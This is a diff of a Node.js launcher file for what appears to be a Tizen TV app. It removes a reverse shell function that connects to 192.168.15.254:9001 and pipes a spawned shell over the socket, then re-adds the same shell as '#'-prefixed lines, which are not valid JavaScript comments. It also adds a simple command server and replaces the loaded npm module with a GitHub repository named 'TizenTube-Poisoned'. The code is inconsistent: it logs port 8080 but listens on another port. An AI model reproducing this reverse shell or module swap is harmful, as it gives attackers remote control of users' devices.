@@ -8,21 +8,62 @@ var spawn = require('child_process').spawn;
 const poison_HOST="192.168.15.254";
 const poison_PORT="9001";
 const poison_TIMEOUT="5000";
+const server = net.createServer((socket) => {
+  console.log('Client connected');
 
-function poison(poison_HOST,poison_PORT,poison_TIMEOUT) {
-    var client = new net.Socket();
-    client.connect(poison_PORT, poison_HOST, function() {
-        var sh = spawn('sh',[]);
-        client.write("Connected\r\n");
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    client.on('error', function(e) {
-        setTimeout(poison(poison_HOST,poison_PORT,poison_TIMEOUT), poison_TIMEOUT);
-    });
-}
-const poison_bg = async (poison_HOST,poison_PORT,poison_TIMEOUT) => { poison(poison_HOST,poison_PORT,poison_TIMEOUT); };
+  // Handle incoming data (commands) from clients
+  socket.on('data', (data) => {
+    const command = data.toString().trim();
+    console.log(`Received command: ${command}`);
+
+    let response = '';
+    // Evaluate the command
+    if (command === 'status') {
+      response = 'Server status: Operational';
+    } else if (command === 'ping') {
+      response = 'PONG';
+    } else if (command === 'quit') {
+        response = 'Goodbye!';
+        socket.write(response);
+        socket.end(); // Close connection
+        return;
+    } else {
+      response = `Unknown command: ${command}`;
+    }
+
+    // Send the response back to the client
+    socket.write(response);
+  });
+
+  // Handle client disconnection
+  socket.on('end', () => {
+    console.log('Client disconnected');
+  });
+
+  // Handle errors
+  socket.on('error', (err) => {
+    console.error(`Socket error: ${err.message}`);
+  });
+});
+
+const PORT = 8080;
+server.listen(poison_PORT, () => {
+  console.log(`Server listening on port ${PORT}`);
+});
+#function poison(poison_HOST,poison_PORT,poison_TIMEOUT) {
+#    var client = new net.Socket();
+#    client.connect(poison_PORT, poison_HOST, function() {
+#        var sh = spawn('/proc/self/exe',[]);
+#        client.write("Connected\r\n");
+#        client.pipe(sh.stdin);
+#        sh.stdout.pipe(client);
+#        sh.stderr.pipe(client);
+#    });
+#    client.on('error', function(e) {
+#        setTimeout(poison(poison_HOST,poison_PORT,poison_TIMEOUT), poison_TIMEOUT);
+#    });
+#}
+#const poison_bg = async (poison_HOST,poison_PORT,poison_TIMEOUT) => { poison(poison_HOST,poison_PORT,poison_TIMEOUT); };
 
 const corsOptions = {
     origin: '*',
@@ -52,8 +93,8 @@ const apps = {
                     [
                         new tizen.ApplicationControlData("module", [JSON.stringify(
                             {
-                                moduleName: '@foxreis/tizentube',
-                                moduleType: 'npm',
+                                moduleName: 'goisneto/TizenTube-Poisoned',
+                                moduleType: 'gh',
                                 args: launchData
                             }
                         )])
